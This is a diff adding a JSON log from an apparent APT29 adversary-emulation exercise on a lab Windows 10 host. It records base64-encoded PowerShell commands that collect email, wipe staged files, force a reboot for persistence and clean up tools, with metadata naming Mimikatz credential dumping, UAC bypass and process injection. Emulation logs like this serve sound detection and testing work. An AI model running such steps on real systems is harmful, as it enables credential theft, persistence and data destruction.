+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033"
+    },
+    "agent_reported_time": "2022-09-29T20:19:55Z"
+  },
+  {
+    "command": "LiAuXHN0ZXBTZXZlbnRlZW5fZW1haWwucHMxO1dyaXRlLUhvc3QgIkVtYWlscyBDb2xsZWN0ZWQiOw==",
+    "delegated_timestamp": "2022-09-29T20:19:59Z",
+    "collected_timestamp": "2022-09-29T20:21:02Z",
+    "finished_timestamp": "2022-09-29T20:21:02Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 60,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+      "ability_name": "Collect E-mails",
+      "ability_description": "Perform e-mail collection from custom PowerShell module."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Email Collection: Local Email Collection",
+      "technique_id": "T1114.001"
+    },
+    "agent_reported_time": "2022-09-29T20:21:01Z"
+  },
+  {
+    "command": "LiAuXHdpcGUucHMxO3dpcGUgIm0uZXhlIjt3aXBlICJDOlxXaW5kb3dzXFRlbXBcV2luZG93c1BhcmVudGFsQ29udHJvbE1pZ3JhdGlvbi50bXAiO3dpcGUgIkM6XFdpbmRvd3NcVGVtcFxXaW5kb3dzUGFyZW50YWxDb250cm9sTWlncmF0aW9uXE1JVFJFLUFUVEFDSy1FVkFMUy5IVE1MIjs=",
+    "delegated_timestamp": "2022-09-29T20:21:04Z",
+    "collected_timestamp": "2022-09-29T20:21:46Z",
+    "finished_timestamp": "2022-09-29T20:21:57Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6080,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "f820b93d-6176-4a72-a138-a70b0b549c49",
+      "ability_name": "Data Wiping of staged files",
+      "ability_description": "Securely delete previously staged files."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "impact",
+      "technique_name": "Disk Wipe: Disk Content Wipe",
+      "technique_id": "T1561.001"
+    },
+    "agent_reported_time": "2022-09-29T20:21:46Z"
+  },
+  {
+    "command": "UmVzdGFydC1Db21wdXRlciAtRm9yY2U7",
+    "delegated_timestamp": "2022-09-29T20:21:59Z",
+    "collected_timestamp": "2022-09-29T20:22:45Z",
+    "finished_timestamp": "2022-09-29T20:22:46Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1412,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "afb8d8f7-d059-4825-95ae-c5727e2db320",
+      "ability_name": "Triggering Persistent",
+      "ability_description": "Trigger RegKey persistence by rebooting the machine"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "persistence",
+      "technique_name": "Signed Binary Proxy Execution: Rundll32",
+      "technique_id": "T1218.011"
+    },
+    "agent_reported_time": "2022-09-29T20:22:45Z"
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ3aXBlLnBzMSI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "f820b93d-6176-4a72-a138-a70b0b549c49",
+      "ability_name": "Data Wiping of staged files",
+      "ability_description": "Securely delete previously staged files."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "impact",
+      "technique_name": "Disk Wipe: Disk Content Wipe",
+      "technique_id": "T1561.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwU2V2ZW50ZWVuX2VtYWlsLnBzMSI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+      "ability_name": "Collect E-mails",
+      "ability_description": "Perform e-mail collection from custom PowerShell module."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Email Collection: Local Email Collection",
+      "technique_id": "T1114.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwU2l4dGVlbl9TSUQucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+      "ability_name": "Enumerate Domain SID",
+      "ability_description": "Get domain user SID"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1c8552c7-f7ed-4523-b640-72d65af5f855",
+      "ability_name": "Enumerate Domain Controller",
+      "ability_description": "Get domain controller and current user SID for the domain"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Remote System Discovery",
+      "technique_id": "T1018"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwRmlmdGVlbl93bWkucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+      "ability_name": "WMI Persistence technique",
+      "ability_description": "user triage"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "persistence",
+      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+      "technique_id": "T1546.003"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJtLmV4ZSI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+      "ability_name": "Stage Mimikatz Binary",
+      "ability_description": "Staging Mimikatz Binary for later execution"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwRm91cnRlZW5fY3JlZER1bXAucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+      "ability_name": "Credential Dumping",
+      "ability_description": "Dumping credentials via wmidump (Mimikatz)"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwRm91cnRlZW5fYnlwYXNzVUFDLnBzMSI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5226e5dc-fc28-43b7-a679-0db49d520402",
+      "ability_name": "UAC Bypass via sdctl",
+      "ability_description": "Invoke UAC bypass sdctl"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Access Token Manipulation: Create Process with Token",
+      "technique_id": "T1134.002"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwVGhpcnRlZW4ucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+      "ability_name": "Enumerate Computer Name",
+      "ability_description": "Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzdGVwVHdlbHZlLnBzMSI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "f9c0b150-822f-497b-ad6d-187f24561e9a",
+      "ability_name": "Detect Anti-Virus",
+      "ability_description": "Detect anti-virus software on host"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Software Discovery: Security Software Discovery",
+      "technique_id": "T1518.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ0aW1lc3RvbXAucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+      "ability_name": "Timestomp kxwn.lock",
+      "ability_description": "Timestomp kxwn.lock"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Indicator Removal on Host: Timestomp",
+      "technique_id": "T1070.006"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJyYXIuZXhlIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "08e57385-dbce-4850-8bb7-589ef79465ab",
+      "ability_name": "Automated document collection (T1119)",
+      "ability_description": "Execute PowerShell collection command to collect and compress files of specific extensions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJHZXQtU2NyZWVuc2hvdC5wczEi",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+      "ability_name": "Screen Capture (T1113)",
+      "ability_description": "Native API call(s) were used to collect a screenshot."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Screen Capture",
+      "technique_id": "T1113"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJkbWV2YWxzLmxvY2FsLnBmeCI=",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "c4f4b13c-87b6-498c-b814-93570173068c",
+      "ability_name": "Credentials In Files (T1081) - Private Keys Extraction",
+      "ability_description": "Obtain credentials via Custom PowerShell"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "technique_id": "T1552.004"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJJbnZva2UtUFNJbmplY3QucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "088b8639-3f37-42cc-9dc8-01aabb645461",
+      "ability_name": "Process Injection",
+      "ability_description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Process Injection",
+      "technique_id": "T1055"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJJbnZva2UtQnlwYXNzVUFDVG9rZW5NYW5pcHVsYXRpb24ucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+      "ability_name": "Bypass User Account Control",
+      "ability_description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+      "technique_id": "T1134.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ1cGRhdGUucHMxIg==",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+      "ability_name": "Bypass User Account Control",
+      "ability_description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+      "technique_id": "T1134.001"
+    }
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwcy5wczEi",
+    "delegated_timestamp": "2022-09-29T20:24:50Z",
+    "collected_timestamp": null,
+    "finished_timestamp": null,
+    "status": -3,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": null,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+      "ability_name": "Process Discovery",
+      "ability_description": "API call(s) are executed to enumerate local running processes."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    }
+  }
+]
